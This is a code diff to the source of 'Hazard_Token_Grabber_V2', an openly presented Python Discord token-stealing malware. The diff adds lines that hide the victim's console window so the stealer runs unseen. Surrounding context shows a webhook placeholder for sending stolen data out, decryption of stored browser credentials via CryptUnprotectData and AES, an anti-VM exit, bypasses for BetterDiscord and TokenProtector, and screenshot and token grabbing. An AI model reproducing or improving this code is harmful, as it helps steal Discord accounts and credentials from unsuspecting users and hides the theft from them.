@@ -13,11 +13,13 @@ import subprocess
 
 from sys import argv
 from PIL import ImageGrab
+from win32con import SW_HIDE
 from base64 import b64decode
 from tempfile import mkdtemp
 from re import findall, match
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
+from win32gui import GetForegroundWindow, ShowWindow
 
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
@@ -152,6 +154,8 @@ class Hazard_Token_Grabber_V2(functions):
         if self.fetchConf('anti_debug'):
             if AntiDebug().inVM:
                 os._exit(0)
+        window = win32gui.GetForegroundWindow()
+        win32gui.ShowWindow(window , win32con.SW_HIDE)
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
